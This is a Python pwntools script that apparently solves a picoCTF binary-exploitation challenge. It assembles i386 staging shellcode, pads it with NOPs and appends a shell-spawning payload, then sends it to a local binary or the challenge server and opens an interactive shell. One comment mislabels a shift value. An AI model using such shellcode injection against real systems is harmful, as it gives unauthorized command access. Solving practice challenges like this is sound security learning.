#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'i386'

BIN = './fun'

if len(sys.argv) > 1:
    r = remote('mercury.picoctf.net', 16460)
else:
    r = process(BIN)

sc = b''
sc += asm('xor ebx, ebx')
sc += asm('inc ebx; nop') # 1
sc += asm('shl ebx, 1') # 2
sc += asm('shl ebx, 1') # 4
sc += asm('shl ebx, 1') # 8
sc += asm('shl ebx, 1') # 16
sc += asm('shl ebx, 1') # 32
sc += asm('shl ebx, 1') # 32
sc += asm('add ebp, ebx')
sc += asm("call ebp")
sc = sc.ljust(0x40, b'\x90')
sc += asm(shellcraft.sh())

input()
r.sendline(sc)
r.interactive()
